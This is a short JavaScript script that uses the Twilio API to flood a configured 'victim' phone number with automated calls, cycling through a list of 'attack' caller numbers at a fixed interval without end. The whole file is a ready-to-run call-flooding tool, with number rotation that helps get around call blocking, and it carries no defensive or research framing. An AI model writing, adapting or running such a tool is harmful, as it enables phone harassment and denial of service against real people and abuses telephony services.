import config from './config.js';
import twilio from 'twilio';

const accountSid = config.TWILIO_ACCOUNT_SID;
const authToken = config.TWILIO_AUTH_TOKEN;
const victimNumber = config.victimNumber;
const attackNumbers = config.attackNumbers;
const attackDelay = config.attackDelay * 1000;

const client = twilio(accountSid, authToken);

let index = 0;

function call() {
    console.log(`[+] Calling ${victimNumber} using ${attackNumbers[index]}`);
    
    client.calls.create({
        twiml: '<Response><Say>You look so happy! Keep going! Your life is beautiful!</Say></Response>',
        to: victimNumber,
        from: attackNumbers[index++]
    }).then(call => {
        console.log(`[+] Call succeed. SID: ${call.sid}`);
    }).catch(err => {
        console.log(err);
    });

    index %= attackNumbers.length;
}

function flood() {
    console.warn("[*] Starting attack...");
    setInterval(call, attackDelay);
}

flood();
